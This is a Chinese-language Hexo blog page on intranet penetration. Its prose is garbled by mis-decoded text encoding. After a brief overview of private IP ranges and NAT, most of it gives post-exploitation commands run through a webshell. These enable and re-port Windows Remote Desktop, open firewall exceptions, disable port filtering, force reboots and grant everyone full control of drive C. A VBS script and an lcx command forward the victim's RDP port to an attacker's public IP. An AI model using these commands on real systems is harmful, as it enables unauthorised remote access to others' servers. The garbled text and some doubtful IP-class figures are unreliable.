<!DOCTYPE html>
<html lang="zh-Hans">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="future.zhangyan">



    <meta name="description" content="æœªæ¥å¯æœŸ">



<title>å†…ç½‘æ¸—é€ | Hexo</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    




	<!--åŠ¨æ€çº¿æ¡èƒŒæ™¯-->

<meta name="generator" content="Hexo 5.1.1"></head>

<body>
    <div class="wrapper">
        <header>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>

    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">å¼ è‰³&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
				<label for="switch_default" class="toggleBtn"></label>
         
				<div class="search bar7">
					<form id="search-form"> <!-- æœç´¢æ¡†ç›¸å…³ -->
						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
						<button type="submit" class="search-form-submit"></button>
						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- æ¸…ç©º/é‡ç½®æœç´¢æ¡† -->
					</form>
					<div class="ins-section-wrapper">
						<div class="ins-section-container"></div>
					</div>
					<div id="local-search-result"></div> <!-- æœç´¢ç»“æœåŒº -->
						<p class='no-result'>No results found </p> <!-- æ— åŒ¹é…æ—¶æ˜¾ç¤ºï¼Œæ³¨æ„è¯·åœ¨ CSS ä¸­è®¾ç½®é»˜è®¤éšè— -->
					</div>


        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">å¼ è‰³&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
            </div>


        </div>
    </nav>

</header>
<style type="text/css">
	* {
		box-sizing:border-box;
	}
	body {
		margin:0;
		padding:0;
		background-image:url(ydrzimages/p3.jpg);
		font-weight:500;
		font-family:"Microsoft YaHei","å®‹ä½“","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
	}
	#container {
		width:500px;
		height:820px;
		margin:0 auto;
	}
	div.search {
		padding:10px 0;
		margin-left:200px
	}
	form {
		position:relative;
		width:300px;
		margin:0 auto;
	}
	input,button {
		border:none;
		outline:none;
	}
	input {
		width:100%;
		height:42px;
		padding-left:13px;
	}
	button {
		height:42px;
		width:42px;
		cursor:pointer;
		position:absolute;
	}
	/*æœç´¢æ¡†7*/
		  
	.bar7 form {
		height:42px;
	}
	.bar7 input {
		width:200px;
		border-radius:42px;
		border:2px solid #324B4E;
		transition:.3s linear;
		float:right;
	}
	.bar7 input:focus {
		width:300px;
	}
	.bar7 button {
		background:none;
		top:-2px;
		right:20px;
	}
	.bar7 button:before {
		content:"ç‚¹..";
		font-family:FontAwesome;
		color:#324b4e;
	}
	.no-result{
		display:none
	}
</style>

<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">å†…ç½‘æ¸—é€</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">August 16, 2020&nbsp;&nbsp;23:06:21</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">ç½‘ç»œå®‰å…¨</a>
                            
                        </span>
						<span id="/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="leancloud-visitors view" data-flag-title="å†…ç½‘æ¸—é€">
						  <em class="post-meta-item-text">Pageviews:</em>
						  <i class="leancloud-visitors-count"></i>
						</span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="æ€»ç»“å›¾"><a href="#æ€»ç»“å›¾" class="headerlink" title="æ€»ç»“å›¾"></a>æ€»ç»“å›¾</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.png"></p>
<h2 id="å†…ç½‘æ¦‚è¿°"><a href="#å†…ç½‘æ¦‚è¿°" class="headerlink" title="å†…ç½‘æ¦‚è¿°"></a>å†…ç½‘æ¦‚è¿°</h2><p>å†…ç½‘IPæ˜¯ä»¥ä¸‹é¢å‡ ä¸ªæ®µbaiå¼€å¤´çš„IP.ç”¨æˆ·å¯ä»¥è‡ªå·±è®¾ç½®du.å¸¸ç”¨çš„zhiå†…ç½‘IPåœ°å€:</p>
<ul>
<li>10.x.x.x</li>
<li>172.16.x.xè‡³172.31.x.x</li>
<li>192.168.x.x</li>
</ul>
<p>ã€€å†…ç½‘çš„è®¡ç®—æœºä»¥<strong>NAT</strong>ï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰åè®®ï¼Œé€šè¿‡ä¸€ä¸ªå…¬å…±çš„ç½‘å…³è®¿é—®Internetã€‚å†…ç½‘çš„è®¡ç®—æœºå¯å‘Internetä¸Šçš„å…¶ä»–è®¡ç®—æœºå‘é€è¿æ¥è¯·æ±‚ï¼Œä½†Internetä¸Šå…¶ä»–çš„è®¡ç®—æœºæ— æ³•å‘å†…ç½‘çš„è®¡ç®—æœºå‘é€è¿æ¥è¯·æ±‚ã€‚</p>
<p>ã€€NATï¼ˆNetwork Address Translatorï¼‰æ˜¯ç½‘ç»œåœ°å€è½¬æ¢ï¼Œå®ƒå®ç°å†…ç½‘çš„IPåœ°å€ä¸å…¬ç½‘çš„åœ°å€ä¹‹é—´çš„ç›¸äº’è½¬æ¢ï¼Œå°†å¤§é‡çš„å†…ç½‘IPåœ°å€è½¬æ¢ä¸ºä¸€ä¸ªæˆ–å°‘é‡çš„å…¬ç½‘IPåœ°å€ï¼Œå‡å°‘å¯¹å…¬ç½‘IPåœ°å€çš„å ç”¨ã€‚NATçš„æœ€å…¸å‹åº”ç”¨æ˜¯ï¼šåœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œåªéœ€è¦ä¸€å°è®¡ç®—æœºè¿æ¥ä¸ŠInternetï¼Œå°±å¯ä»¥åˆ©ç”¨NATå…±äº«Internetè¿æ¥ï¼Œä½¿å±€åŸŸç½‘å†…å…¶ä»–è®¡ç®—æœºä¹Ÿå¯ä»¥ä¸Šç½‘ã€‚ä½¿ç”¨NATåè®®ï¼Œå±€åŸŸç½‘å†…çš„è®¡ç®—æœºå¯ä»¥è®¿é—®Internetä¸Šçš„è®¡ç®—æœºï¼Œä½†Internetä¸Šçš„è®¡ç®—æœºæ— æ³•è®¿é—®å±€åŸŸç½‘å†…çš„è®¡ç®—æœºã€‚</p>
<p>ã€€Windowsæ“ä½œç³»ç»Ÿçš„Internetè¿æ¥å…±äº«ã€sygateã€winrouteã€unix/linuxçš„natdç­‰è½¯ä»¶ï¼Œéƒ½æ˜¯ä½¿ç”¨NATåè®®æ¥å…±äº«Internetè¿æ¥ã€‚ã€€ã€€</p>
<p>Â  Â  æ‰€æœ‰ISPï¼ˆInternetæœåŠ¡æä¾›å•†ï¼‰æä¾›çš„å†…ç½‘Internetæ¥å…¥æ–¹å¼ï¼Œå‡ ä¹éƒ½æ˜¯åŸºäºNATåè®®çš„ã€‚</p>
<h3 id="å†…ç½‘IP-è¯¦ç»†"><a href="#å†…ç½‘IP-è¯¦ç»†" class="headerlink" title="å†…ç½‘IP è¯¦ç»†:"></a><strong>å†…ç½‘IP è¯¦ç»†</strong>:</h3><p>å¤§éƒ¨åˆ†ç½‘ç»œä½¿ç”¨Bç±»æˆ–Cç±»åœ°å€ï¼Œæ¯ä¸€ä¸ªç±»çš„ç¬¬ä¸€ä¸ªå…«ä½ç»„çš„èŒƒå›´å¦‚ä¸‹ï¼š</p>
<h4 id="1ã€-0-â€”127ã€‚"><a href="#1ã€-0-â€”127ã€‚" class="headerlink" title="1ã€ 0-â€”127ã€‚"></a>1ã€ 0-â€”127ã€‚</h4><p>Aç±» ç½‘ç»œå·ç èŒƒå›´æ˜¯ 0.0.0.0â€”127.0.0.0 ,ç”¨äº128ä¸ªç½‘ç»œã€‚ä½†ç½‘ç»œä¸èƒ½å…¨ç”±0ç»„æˆä¸”127.0.0.0ä¿ç•™ç”¨äºå›è·¯ã€‚å‰©ä¸‹çš„126ä¸ªç½‘ç»œï¼Œ1åˆ°126ï¼Œå…±æœ‰16777214ä¸ªå¯èƒ½çš„ä¸»æœºåœ°å€ï¼ˆ16777216å‡2ï¼‰</p>
<p>Aç±» ç½‘ç»œ â€”ä¸»æœºâ€”ä¸»æœºâ€”ä¸»æœº</p>
<p>0-127 127 0 0 0</p>
<h4 id="2ã€-128â€”191ã€‚"><a href="#2ã€-128â€”191ã€‚" class="headerlink" title="2ã€ 128â€”191ã€‚"></a>2ã€ 128â€”191ã€‚</h4><p>Bç±»ï¼Œç½‘ç»œå·ç èŒƒå›´æ˜¯128.0.0.0â€“191.254.0.0 ç”¨äº16256ä¸ªç½‘ç»œã€‚å…±æœ‰65534ä¸ªå¯èƒ½çš„ä¸»æœºåœ°å€</p>
<p>Bç±» ç½‘ç»œâ€”ç½‘ç»œâ€”-ä¸»æœºâ€”ä¸»æœº</p>
<p>128-191 128 123 0 0</p>
<h4 id="3ã€-192â€“223ã€‚"><a href="#3ã€-192â€“223ã€‚" class="headerlink" title="3ã€ 192â€“223ã€‚"></a>3ã€ 192â€“223ã€‚</h4><p>Cç±»ï¼Œç½‘ç»œå·ç èŒƒå›´æ˜¯192.0.0.0â€“223.254.254.0ï¼Œç”¨äº2064512ä¸ªç½‘ç»œã€‚å…±æœ‰254ä¸ªå¯èƒ½çš„ä¸»æœºåœ°å€</p>
<p>Cç±» ç½‘ç»œâ€”ç½‘ç»œâ€”-ç½‘ç»œâ€”ä¸»æœº</p>
<p>192-223 192 0 0 0</p>
<p>æ‰€æœ‰çš„ç½‘ç»œç©ºé—´è®¡ç®—éƒ½å¿…é¡»â€œå‡2â€ï¼Œè¿™æ˜¯å› ä¸ºè¦æ‰£é™¤ä¸¤ä¸ªä¿ç•™åœ°å€ï¼šâ€œ0â€ä¸ºç½‘ç»œå·ï¼Œâ€œ255â€ä¸ºå¹¿æ’­ã€‚åœ°å€1-254åˆ†é…ç»™ä¸»æœºã€‚</p>
<p>ç¬¬ä¸€ä¸ªå…«ä½ç»„å·ç 224-254ä¿ç•™ç»™åœ¨è¿™å„¿æœªè®¨è®ºçš„ç‰¹æ®Šç±»ï¼ˆç»„æ’­å’Œå®éªŒï¼‰ã€‚</p>
<p>é€šè¿‡ä¸Šè¿°è®¨è®ºï¼Œå¯ä»¥çŸ¥é“åªæœ‰å¾ˆå°‘æ•°éå¸¸å¤§çš„ç»„ç»‡æ‰èƒ½æ‹¥æœ‰Aç±»åœ°å€ï¼Œå®é™…ä¸Šåªæœ‰126ä¸ªè¿™æ ·çš„ç»„ç»‡ï¼Œæˆ‘ä»¬ä¸­å¤§å¤šæ•°ç”¨çš„æ˜¯Bç±»å’ŒCç±»IPåœ°å€ä¸INTERNETç›¸è¿ã€‚</p>
<h2 id="ğŸƒä¸€ã€é€šè¿‡webshellå¼€å¯3389"><a href="#ğŸƒä¸€ã€é€šè¿‡webshellå¼€å¯3389" class="headerlink" title="ğŸƒä¸€ã€é€šè¿‡webshellå¼€å¯3389"></a>ğŸƒä¸€ã€é€šè¿‡webshellå¼€å¯3389</h2><p>1.æŸ¥è¯¢ç»ˆç«¯ç«¯å£</p>
<h2 id="xp-amp-2003ï¼šREG-query-HKLM-SYSTEM-CurrentControlSet-Control-Terminalâ€-â€œServer-WinStations-RDP-Tcp-v-PortNumber"><a href="#xp-amp-2003ï¼šREG-query-HKLM-SYSTEM-CurrentControlSet-Control-Terminalâ€-â€œServer-WinStations-RDP-Tcp-v-PortNumber" class="headerlink" title="xp&amp;2003ï¼šREG query HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer\WinStations\RDP-Tcp /v PortNumber"></a>xp&amp;2003ï¼šREG query HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer\WinStations\RDP-Tcp /v PortNumber</h2><p>é€šç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit &#x2F;e tsp.reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">type tsp.reg</span><br></pre></td></tr></table></figure>

<p>2.å¼€å¯XP&amp;2003ç»ˆç«¯æœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>3.æ›´æ”¹ç»ˆç«¯ç«¯å£ä¸º20008(0x4E28)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x4E28 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>4.å–æ¶ˆxp&amp;2003ç³»ç»Ÿé˜²ç«å¢™å¯¹ç»ˆç«¯æœåŠ¡3389ç«¯å£çš„é™åˆ¶åŠIPè¿æ¥çš„é™åˆ¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List &#x2F;v 3389:TCP &#x2F;t REG_SZ &#x2F;d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>5.å¼€å¯Win2000çš„ç»ˆç«¯ï¼Œç«¯å£ä¸º3389(éœ€é‡å¯)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;2000.reg</span><br><span class="line">echo. &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Enabled&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;ShutdownWithoutLogon&quot;&#x3D;&quot;0&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;EnableAdminTSRemote&quot;&#x3D;dword:00000001 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;TSEnabled&quot;&#x3D;dword:00000001 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Start&quot;&#x3D;dword:00000002 &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;Hotkey&quot;&#x3D;&quot;1&quot; &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] &gt;&gt;2000.reg</span><br><span class="line">echo &quot;PortNumber&quot;&#x3D;dword:00000D3D &gt;&gt;2000.reg</span><br></pre></td></tr></table></figure>

<p>6.å¼ºè¡Œé‡å¯Win2000&amp;Win2003ç³»ç»Ÿ(æ‰§è¡Œå®Œæœ€åä¸€æ¡ä¸€å¥åè‡ªåŠ¨é‡å¯)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF &amp; cd&#x2F;d %temp% &amp; echo [version] &gt; restart.inf</span><br><span class="line">(set inf&#x3D;InstallHinfSection DefaultInstall)</span><br><span class="line">echo signature&#x3D;$chicago$ &gt;&gt; restart.inf</span><br><span class="line">echo [defaultinstall] &gt;&gt; restart.inf</span><br><span class="line">rundll32 setupapi,%inf% 1 %temp%\restart.inf</span><br></pre></td></tr></table></figure>

<p>7.ç¦ç”¨TCP/IPç«¯å£ç­›é€‰ (éœ€é‡å¯)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters &#x2F;v EnableSecurityFilters &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>8.ç»ˆç«¯è¶…å‡ºæœ€å¤§è¿æ¥æ•°æ—¶å¯ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è¿æ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc &#x2F;v:ip:3389 &#x2F;console</span><br></pre></td></tr></table></figure>

<p>9.è°ƒæ•´NTFSåˆ†åŒºæƒé™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">cacls c: &#x2F;e &#x2F;t &#x2F;g everyone:F (æ‰€æœ‰äººå¯¹cç›˜éƒ½æœ‰ä¸€åˆ‡æƒåˆ©)</span><br><span class="line"></span><br><span class="line">cacls %systemroot%\system32\*.exe &#x2F;d everyone (æ‹’ç»æ‰€æœ‰äººè®¿é—®system32ä¸­exeæ–‡ä»¶)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">3389.vbs cscript.exe</span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line">const HKEY_LOCAL_MACHINE &#x3D; &amp;H80000002</span><br><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set StdOut &#x3D; WScript.StdOut</span><br><span class="line">Set oReg&#x3D;GetObject(&quot;winmgmts:&#123;impersonationLevel&#x3D;impersonate&#125;!\\&quot; &amp;_</span><br><span class="line">strComputer &amp; &quot;\root\default:StdRegProv&quot;)</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><br><span class="line">oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><br><span class="line">strValueName &#x3D; &quot;fDenyTSConnections&quot;</span><br><span class="line">dwValue &#x3D; 0</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot;</span><br><span class="line">strValueName &#x3D; &quot;PortNumber&quot;</span><br><span class="line">dwValue &#x3D; 3389</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">strKeyPath &#x3D; &quot;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span><br><span class="line">strValueName &#x3D; &quot;PortNumber&quot;</span><br><span class="line">dwValue &#x3D; 3389</span><br><span class="line">oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,dwValue</span><br><span class="line">Set R &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">R.run(&quot;Shutdown.exe -r -t 0&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="é€šè¿‡3389å·¥å…·å¼€å¯è¿œç¨‹ç»ˆç«¯"><a href="#é€šè¿‡3389å·¥å…·å¼€å¯è¿œç¨‹ç»ˆç«¯" class="headerlink" title="é€šè¿‡3389å·¥å…·å¼€å¯è¿œç¨‹ç»ˆç«¯"></a>é€šè¿‡3389å·¥å…·å¼€å¯è¿œç¨‹ç»ˆç«¯</h3><h2 id="æœåŠ¡å™¨ç«¯å£è¢«ä¿®æ”¹å¦‚ä½•æŸ¥æ‰¾"><a href="#æœåŠ¡å™¨ç«¯å£è¢«ä¿®æ”¹å¦‚ä½•æŸ¥æ‰¾" class="headerlink" title="æœåŠ¡å™¨ç«¯å£è¢«ä¿®æ”¹å¦‚ä½•æŸ¥æ‰¾"></a>æœåŠ¡å™¨ç«¯å£è¢«ä¿®æ”¹å¦‚ä½•æŸ¥æ‰¾</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç›®å‰ä¸»è¦é€šè¿‡æ³¨å†Œè¡¨è¯»å–ã€ç«¯å£æ‰«æã€å‘½ä»¤æ¢é’ˆç­‰ä¸‰ç§æ–¹æ³•æŸ¥æ‰¾ä¿®æ”¹åçš„ç«¯å£</span><br></pre></td></tr></table></figure>

<h2 id="æœåŠ¡å™¨å¤„äºå†…ç½‘å¦‚ä½•è¿œç¨‹è¿æ¥"><a href="#æœåŠ¡å™¨å¤„äºå†…ç½‘å¦‚ä½•è¿œç¨‹è¿æ¥" class="headerlink" title="æœåŠ¡å™¨å¤„äºå†…ç½‘å¦‚ä½•è¿œç¨‹è¿æ¥"></a>æœåŠ¡å™¨å¤„äºå†…ç½‘å¦‚ä½•è¿œç¨‹è¿æ¥</h2><h3 id="1ã€æ‹¥æœ‰å…¬ç½‘ipçš„æ¡ä»¶ä¸‹"><a href="#1ã€æ‹¥æœ‰å…¬ç½‘ipçš„æ¡ä»¶ä¸‹" class="headerlink" title="1ã€æ‹¥æœ‰å…¬ç½‘ipçš„æ¡ä»¶ä¸‹"></a>1ã€æ‹¥æœ‰å…¬ç½‘ipçš„æ¡ä»¶ä¸‹</h3><p>1ã€é€šè¿‡lcxå·¥å…·è§£å†³å†…ç½‘è¿œç¨‹è¿æ¥<br>ä¸Šä¼ ä¸€ä¸ªcmd.exeæ–‡ä»¶å’Œlckå·¥å…·ç„¶åsetp cmd.exeè®¾ç½®ç»ˆç«¯è·¯å¾„è§£å†³è¿è¡Œæƒé™é—®é¢˜ã€‚</p>
<blockquote>
<p>Webshellä¸Šæ‰§è¡Œï¼šlcx.exe -slave è‡ªå·±çš„å…¬ç½‘ip 2222 127.0.0.1 3389 ï¼ˆå°†æœ¬æœº3389ç«¯å£æµé‡è½¬å‘åˆ°å…¬ç½‘ipçš„2222ç«¯å£ä¸Šå»ï¼‰</p>
</blockquote>
<blockquote>
<p>è‡ªå·±çš„ç”µè„‘é‡Œé¢æ‰§è¡Œï¼šlcx.exe -listen 2222 4444 ï¼ˆç›‘å¬æœ¬åœ°çš„2222ç«¯å£å°†æµé‡è½¬å‘åˆ°4444 ï¼‰</p>
</blockquote>
